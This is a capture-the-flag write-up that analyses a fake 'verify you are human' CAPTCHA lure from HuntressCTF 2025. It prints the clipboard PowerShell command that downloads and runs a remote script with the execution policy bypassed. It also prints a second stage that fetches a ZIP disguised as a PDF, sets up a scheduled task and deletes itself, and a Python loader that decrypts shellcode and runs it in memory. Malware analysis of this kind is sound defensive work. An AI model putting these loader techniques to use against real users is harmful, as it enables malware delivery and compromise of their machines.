---
title: "HuntressCTF 2025 - Verify You Are Human"
date: 2025-10-02
categories: [Capture The Flags, HuntressCTF2025]
tags: [CTF, Writeups, Malware Analysis]
---

## Challenge Prompt

My computer said I needed to update MS Teams, so that is what I have been trying to do...

...but I can't seem to get past this CAPTCHA!

---

## 1. Getting started

When the site was loaded, there was a verify you are a human prompt

![ui](/assets/img/huntressCTF2025/verify-yourself/ui.png)

On clicking the box, the verification failed and this screen came

![on clicking](/assets/img/huntressCTF2025/verify-yourself/ui2.png)

Interesting..Instead of doing what was said, I opened a notepad and pasted the content and this was copied from the clipboard

```powershell

"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://7b63c919.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"

```

Well I never copied it myself so probably clicking that box did the work

Because of this I went to inspect the page and see what was happening. In one of the scrips was a function which copied the string to our clipboard whenever that box was pressed

I could see the encoded base64 string of the command that was copied in the script

![encoded string](/assets/img/huntressCTF2025/verify-yourself/script.png)


## 1.1 

Analysing the copied command, it was downloading a script from `http://7b63c919.proxy.coursestack.com:443/?tic=1'` and save it as a random.ps1 under User's LocalAppData and then it is launching another powershell to execute the downloaded script while bypassing execution policy

I proceeded with downloading the powershell script and save it in a text file to analyse it 

```bash

~/Downloads ❯ curl -sS -b "token=7b63c919-10e4-4a16-842b-182fbb027cf7_1_7d37776cbdcf24886136da47a8061a54965b3dcf7bb8ff12073e9707e296b5f9" 'http://7b63c919.proxy.coursestack.com:443/?tic=1' -o script.txt
~/Downloads ❯ cat script.txt 
<html>
<head><title>400 The plain HTTP request was sent to HTTPS port</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<center>The plain HTTP request was sent to HTTPS port</center>
</body>
</html>

```

The file didn't download and upon looking closer I could see we are using http protocol but with port no. 443, which is actually used for HTTPS protocol, so maybe that's why. I went ahead and changed http to https in the url and tried downloading it again

Successful!

---

## 2. Second Powershell Script

```bash

~/Downloads ❯ curl -sS -b "token=7b63c919-10e4-4a16-842b-182fbb027cf7_1_7d37776cbdcf24886136da47a8061a54965b3dcf7bb8ff12073e9707e296b5f9" 'https://7b63c919.proxy.coursestack.com/?tic=1' -o script.txt
~/Downloads ❯ cat script.txt 
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://7b63c919.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard

```

Upon analysing the script, I gathered the following info:

1. $JGFDGMKNGD builds the string ".pyc" (char codes: 46='.',112='p',121='y',99='c').

2. $HMGDSHGSHSHS = [guid]::NewGuid() → a random GUID, used as the folder/filename (persistence / evasion).

3. irm '...tic=2' -OutFile ...\<GUID>.pdf → downloads the second-stage payload to %LocalAppData%\<GUID>.pdf. The file name is .pdf but likely contains a ZIP (see next line).

4. Add-Type ... ZipFile::ExtractToDirectory("<GUID>.pdf", "<GUID>") → treats that PDF as a ZIP and extracts it into a directory %LocalAppData%\ <GUID>\.

5. This is a common trick: deliver a ZIP but name as .pdf to avoid simple filters.

6. $PIEVSDDGs is the extraction directory path.

7. $RSHSR... and $RYGS... are set to the extracted pythonw.exe and cpython-3134.pyc.

8. Creates a scheduled task action to run pythonw.exe with the .pyc as argument.

9. Trigger is (Get-Date).AddSeconds(180) → task runs once ~180 seconds from now (3 minutes).

10. Task principal is the current user, interactive, limited privileges.

11. Register-ScheduledTask -TaskName $WQRGSGSD → registers the task with the task name equal to the GUID (so the task name is unpredictable).

12. Set-Location $PIEVSDDGs then Rename-Item -Path "cpython-3134" -NewName "cpython-3134.pyc" — many archives contain a file named cpython-3134 without extension; they rename it to .pyc.

13. iex ('rundll32 shell32.dll,ShellExec_RunDLL "<dir>\pythonw" "<dir>\cpython-3134.pyc"') → immediately launches pythonw to execute the .pyc (via ShellExec to avoid direct Process API).

14. Remove-Item $MyInvocation.MyCommand.Path -Force → deletes the downloaded script.txt (self-delete).

15. Set-Clipboard with no args — likely intended to clear the clipboard or is a mistake; it may error or clear clipboard depending on PowerShell version


So now moving ahead and downloading the ZIP file by using this url in the above command: `http://7b63c919.proxy.coursestack.com:443/?tic=2` 
Again removing port no. and changing http to https

```bash

~/Downloads ❯ curl -sS -b "token=7b63c919-10e4-4a16-842b-182fbb027cf7_1_7d37776cbdcf24886136da47a8061a54965b3dcf7bb8ff12073e9707e296b5f9" 'https://7b63c919.proxy.coursestack.com/?tic=2' -o verify.zip
~/Downloads ❯ file verify.zip 
verify.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

```
---

## 3. Analysing the ZIP file

Unzipping the file and seeing it's content

```bash

~/Downloads/verify ❯ ls
_asyncio.pyd      _decimal.pyd      libffi-8.dll  _multiprocessing.pyd  python313.dll   python.cat   select.pyd    _ssl.pyd          winsound.pyd
_bz2.pyd          _elementtree.pyd  libssl-3.dll  output.py             python313._pth  python.exe   _socket.pyd   unicodedata.pyd   _wmi.pyd
cpython-3134.pyc  _hashlib.pyd      LICENSE.txt   _overlapped.pyd       python313.zip   pythonw.exe  sqlite3.dll   _uuid.pyd         _zoneinfo.pyd
_ctypes.pyd       libcrypto-3.dll   _lzma.pyd     pyexpat.pyd           python3.dll     _queue.pyd   _sqlite3.pyd  vcruntime140.dll

```

Lot of files to analyse so first I proceed to recursively check for "flag" or base64 encoded strings in all the files

I didn't find any "flag" keyword but there was this base64 encoded string in output.py

```bash

~/Downloads/verify ❯ grep -R --line-number -I -E "[A-Za-z0-9+/]{50,}={0,2}" . || true
./output.py:3:exec(base64.b64decode("aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp").decode('utf-8'))

```

The string decoded to:


```powershell

import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()

```
---

## 4. Disassembling the shellcode


First converting the shellcode to hex

```python

import base64
ct_b64 = 'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ==' 
key_b64 = 'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='
ct = base64.b64decode(ct_b64)
key = base64.b64decode(key_b64)
def xor_decrypt(c,k):
    return bytes([c[i] ^ k[i % len(k)] for i in range(len(c))])
open('shellcode.bin','wb').write(xor_decrypt(ct,key))

```

```bash

~/Downloads/verify ❯ python3 code.py                                             
~/Downloads/verify ❯ xxd -p shellcode.bin   
5589e581ec800000006893d884846890c3c69768c39093926890c4c3c768
9c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b9
0a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff00
89e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000
b0018807474975fac9c3

```

Using objdump to disassemble it

```bash

~/Downloads/verify ❯ objdump -D -b binary -m i386:x86-64 shellcode.bin

shellcode.bin:     file format binary


Disassembly of section .data:

0000000000000000 <.data>:
   0:	55                   	push   %rbp
   1:	89 e5                	mov    %esp,%ebp
   3:	81 ec 80 00 00 00    	sub    $0x80,%esp
   9:	68 93 d8 84 84       	push   $0xffffffff8484d893
   e:	68 90 c3 c6 97       	push   $0xffffffff97c6c390
  13:	68 c3 90 93 92       	push   $0xffffffff929390c3
  18:	68 90 c4 c3 c7       	push   $0xffffffffc7c3c490
  1d:	68 9c 93 9c 93       	push   $0xffffffff939c939c
  22:	68 c0 9c c6 c6       	push   $0xffffffffc6c69cc0
  27:	68 97 c6 9c 93       	push   $0xffffffff939cc697
  2c:	68 94 c7 9d c1       	push   $0xffffffffc19dc794
  31:	68 de c1 96 91       	push   $0xffffffff9196c1de
  36:	68 c3 c9 c4 c2       	push   $0xffffffffc2c4c9c3
  3b:	b9 0a 00 00 00       	mov    $0xa,%ecx
  40:	89 e7                	mov    %esp,%edi
  42:	81 37 a5 a5 a5 a5    	xorl   $0xa5a5a5a5,(%rdi)
  48:	83 c7 04             	add    $0x4,%edi
  4b:	49 75 f4             	rex.WB jne 0x42
  4e:	c6 44 24 26 00       	movb   $0x0,0x26(%rsp)
  53:	c6 85 7f ff ff ff 00 	movb   $0x0,-0x81(%rbp)
  5a:	89 e6                	mov    %esp,%esi
  5c:	8d 7d 80             	lea    -0x80(%rbp),%edi
  5f:	b9 26 00 00 00       	mov    $0x26,%ecx
  64:	8a 06                	mov    (%rsi),%al
  66:	88 07                	mov    %al,(%rdi)
  68:	46                   	rex.RX
  69:	47                   	rex.RXB
  6a:	49 75 f7             	rex.WB jne 0x64
  6d:	c6 07 00             	movb   $0x0,(%rdi)
  70:	8d 3c 24             	lea    (%rsp),%edi
  73:	b9 40 00 00 00       	mov    $0x40,%ecx
  78:	b0 01                	mov    $0x1,%al
  7a:	88 07                	mov    %al,(%rdi)
  7c:	47                   	rex.RXB
  7d:	49 75 fa             	rex.WB jne 0x7a
  80:	c9                   	leave
  81:	c3                   	ret

```

This code is performing string decryption using XOR encoding.

Line by line analysis:

1. Setup (line 0-3): Creates a stack frame with 128 bytes (0x80) of local space

2. String Storage (line 9-3b): Pushes 10 DWORD values (40 bytes total) onto the stack; These are the encrypted string bytes

3. XOR Decryption Loop (lines 3b-4c): 
    Sets up a counter (ecx = 0xa = 10 iterations)
    Points edi to the start of the pushed data (esp)
    XORs each DWORD with 0xa5a5a5a5 to decrypt it

4. String Termination (line 4e-53): Adds null terminators at specific positions

---

## 5. Getting the flag

I got the flag by XORing each byte with 0xa5

```python

enc = [0x8484d893, 0x97c6c390, 0x929390c3, 0xc7c3c490, 0x939c939c, 0xc6c69cc0, 0x939cc697, 0xc19dc794, 0x9196c1de, 0xc2c4c9c3]

key = 0xa5

buf = ''

for it in enc:
  buf += hex(it)[2:]

buf = bytes.fromhex(buf)
buf = buf[::-1] # little endian thing


flag = ''
for it in buf:
  flag += chr(it ^ key)

print(flag)

```
Flag: flag{d341b8d2c96e9cc96965afbf5675fc26}

Thank you for reading!

***


